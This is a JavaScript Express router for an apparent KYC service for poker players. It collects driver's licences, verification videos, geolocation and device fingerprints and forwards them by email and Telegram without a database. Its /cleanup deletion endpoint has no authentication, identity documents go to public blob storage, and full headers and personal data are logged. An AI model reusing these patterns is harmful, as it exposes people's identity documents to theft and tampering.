import express from 'express';
import multer from 'multer';
import path from 'path';
import fs from 'fs';
import { v4 as uuidv4 } from 'uuid';
import { put } from '@vercel/blob';
import { sendEmailNotification, sendTelegramNotification, analyzeSecurity } from '../services/notification.js';

const router = express.Router();

// Health check endpoint
router.get('/health', (req, res) => {
  res.json({
    success: true,
    message: 'KYC service is running',
    timestamp: new Date().toISOString()
  });
});

// Test endpoint for upload-url
router.get('/upload-url', (req, res) => {
  res.json({ 
    message: 'Upload URL endpoint is working',
    method: 'GET',
    timestamp: new Date().toISOString()
  });
});

// Configure multer for file uploads (use /tmp on serverless)
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const baseDir = process.env.UPLOAD_DIR || (process.env.VERCEL ? '/tmp' : 'uploads');
    const uploadDir = `${baseDir}/kyc`;
    try {
      if (!fs.existsSync(uploadDir)) {
        fs.mkdirSync(uploadDir, { recursive: true });
      }
    } catch (e) {
      // fallback to /tmp if any error
      const fallback = '/tmp/kyc';
      if (!fs.existsSync(fallback)) {
        fs.mkdirSync(fallback, { recursive: true });
      }
      return cb(null, fallback);
    }
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

const fileFilter = (req, file, cb) => {
  // Allow images and videos
  if (file.mimetype.startsWith('image/') || file.mimetype.startsWith('video/')) {
    cb(null, true);
  } else {
    cb(new Error('Only image and video files are allowed!'), false);
  }
};

const upload = multer({
  storage: storage,
  fileFilter: fileFilter,
  limits: {
    fileSize: 50 * 1024 * 1024 // 50MB limit
  }
});

// Handle preflight OPTIONS request
router.options('/submit', (req, res) => {
  console.log('OPTIONS preflight request received for /submit');
  res.status(200).end();
});

// Handle preflight OPTIONS request for upload-url
router.options('/upload-url', (req, res) => {
  console.log('OPTIONS preflight request received for /upload-url');
  res.status(200).end();
});

// Handle preflight OPTIONS request for upload
router.options('/upload', (req, res) => {
  console.log('OPTIONS preflight request received for /upload');
  res.status(200).end();
});

// Generate upload URL for Vercel Blob (for large files)
router.post('/upload-url', async (req, res) => {
  console.log('Upload URL request received:', {
    method: req.method,
    url: req.url,
    body: req.body,
    headers: req.headers
  });
  
  try {
    const { filename } = req.body;
    
    if (!filename) {
      return res.status(400).json({
        success: false,
        error: 'Filename is required'
      });
    }
    
    const uniqueFilename = `${Date.now()}-${Math.random().toString(36).substring(7)}-${filename}`;
    
    // Generate a signed URL for direct upload
    const { url, pathname } = await put(uniqueFilename, null, {
      access: 'public',
      addRandomSuffix: false
    });
    
    console.log('Upload URL generated successfully:', { url, pathname, filename: uniqueFilename });
    
    res.json({
      success: true,
      uploadUrl: url,
      pathname: pathname,
      filename: uniqueFilename
    });
  } catch (error) {
    console.error('Error generating upload URL:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to generate upload URL'
    });
  }
});

// Handle direct blob upload (for files under 4.5MB)
router.post('/upload', async (req, res) => {
  try {
    const filename = req.headers['x-filename'];
    const uniqueFilename = `${Date.now()}-${Math.random().toString(36).substring(7)}-${filename}`;
    
    // Upload to Vercel Blob
    const blob = await put(uniqueFilename, req, {
      access: 'public',
      addRandomSuffix: false
    });
    
    res.json({
      success: true,
      url: blob.url,
      downloadUrl: blob.downloadUrl,
      pathname: blob.pathname,
      filename: uniqueFilename
    });
  } catch (error) {
    console.error('Error uploading to blob:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to upload file'
    });
  }
});

// Cleanup endpoint (for manual cleanup if needed)
router.post('/cleanup', async (req, res) => {
  try {
    const { urls } = req.body;
    
    if (!urls || !Array.isArray(urls)) {
      return res.status(400).json({
        success: false,
        error: 'URLs array is required'
      });
    }
    
    const { del } = await import('@vercel/blob');
    const results = [];
    
    for (const url of urls) {
      try {
        await del(url);
        results.push({ url, deleted: true });
      } catch (error) {
        results.push({ url, deleted: false, error: error.message });
      }
    }
    
    res.json({
      success: true,
      results: results
    });
  } catch (error) {
    console.error('Error during cleanup:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to cleanup files'
    });
  }
});

// Public KYC submission endpoint (no auth required)
router.post('/submit', upload.fields([
  { name: 'driverLicense', maxCount: 1 },
  { name: 'verificationVideo', maxCount: 1 }
]), async (req, res) => {
  console.log('KYC submission request received:', {
    method: req.method,
    url: req.url,
    headers: req.headers,
    body: req.body,
    files: req.files
  });
  
  try {
    const {
      fullName,
      email,
      phone,
      address,
      city,
      state,
      country,
      postalCode,
      pokerPlatform,
      playerId,
      deviceFingerprint,
      geolocationData,
      deviceSpecs,
      driverLicenseUrl,
      verificationVideoUrl
    } = req.body;

    // Validate required fields
    if (!fullName) {
      return res.status(400).json({ error: 'Full name is required' });
    }

    const submissionId = uuidv4();

    // Parse JSON fields
    let geolocation = null;
    let deviceSpecsData = null;
    
    try {
      if (geolocationData) {
        geolocation = JSON.parse(geolocationData);
      }
      if (deviceSpecs) {
        deviceSpecsData = JSON.parse(deviceSpecs);
      }
    } catch (parseError) {
      console.error('Error parsing JSON data:', parseError);
    }

    // Get client IP
    const clientIP = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 
                    (req.connection.socket ? req.connection.socket.remoteAddress : null);

    // Prepare KYC data for notifications
    const kycData = {
      submissionId,
      fullName,
      email,
      phone,
      address,
      city,
      state,
      country,
      postalCode,
      pokerPlatform,
      playerId,
      ipAddress: clientIP,
      geolocation,
      deviceData: deviceSpecsData,
      deviceFingerprint,
      submittedAt: new Date().toISOString()
    };

    // Analyze security (VPN detection, location mismatch)
    const securityAnalysis = await analyzeSecurity(kycData);
    kycData.vpnDetected = securityAnalysis.vpnDetected;
    kycData.locationMismatch = securityAnalysis.locationMismatch;

    // Prepare files for email attachment
    const files = [];
    
    // Handle traditional file uploads (small files)
    if (req.files?.driverLicense?.[0]) {
      files.push({
        originalname: 'driver_license.jpg',
        path: req.files.driverLicense[0].path
      });
    }
    if (req.files?.verificationVideo?.[0]) {
      files.push({
        originalname: 'verification_video.mp4',
        path: req.files.verificationVideo[0].path
      });
    }
    
    // Handle blob URLs (large files)
    if (driverLicenseUrl) {
      files.push({
        originalname: 'driver_license.jpg',
        url: driverLicenseUrl
      });
    }
    if (verificationVideoUrl) {
      files.push({
        originalname: 'verification_video.mp4',
        url: verificationVideoUrl
      });
    }

    // Send notifications
    try {
      await sendEmailNotification(kycData, files);
      await sendTelegramNotification(kycData);
      console.log('Notifications sent successfully');
    } catch (notificationError) {
      console.error('Error sending notifications:', notificationError);
      // Don't fail the submission if notifications fail
    }
    
    // Note: Files are automatically cleaned up in sendEmailNotification
    console.log('KYC submission processed successfully');

    res.status(201).json({
      success: true,
      message: 'KYC submission received successfully',
      submissionId: submissionId
    });

  } catch (error) {
    console.error('KYC submission error:', error);
    res.status(500).json({
      error: 'Failed to submit KYC data',
      message: error.message
    });
  }
});

// Simple status endpoint (no database needed)
router.get('/status/:submissionId', async (req, res) => {
  try {
    const { submissionId } = req.params;
    
    // Since we're not storing in database, just return a generic status
    res.json({
      success: true,
      data: {
        submission_id: submissionId,
        full_name: 'Submitted',
        status: 'pending',
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
        verification_notes: 'Submission received and under review',
        verified_at: null
      }
    });

  } catch (error) {
    console.error('Error fetching KYC status:', error);
    res.status(500).json({
      error: 'Failed to fetch KYC status',
      message: error.message
    });
  }
});

export default router;
